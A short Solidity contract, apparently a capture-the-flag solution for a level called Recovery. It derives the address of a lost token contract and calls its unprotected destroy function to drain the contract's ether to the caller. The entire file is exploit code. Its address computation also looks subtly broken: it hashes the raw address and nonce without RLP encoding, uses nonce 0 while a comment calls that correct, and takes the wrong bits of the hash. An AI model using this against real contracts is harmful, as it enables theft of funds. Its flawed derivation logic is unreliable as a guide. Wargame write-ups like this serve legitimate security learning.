pragma solidity ^0.8.0;

interface ISimpleToken {
    function destroy(address payable _to) external;
}


contract RecoveryAttacker {

    function attack(address recoveryInstance) public {
        address tokenAddress;
        assembly {
            mstore(0x00, recoveryInstance)
            mstore(0x20, 0) // Correct nonce is 0
            
            // Calculate keccak256 over the first 64 bytes (0x00 to 0x40)
            let hashedAddress := keccak256(0x00, 64)
            tokenAddress := shr(96, hashedAddress)
        }
        ISimpleToken(tokenAddress).destroy(payable(msg.sender));
    }
}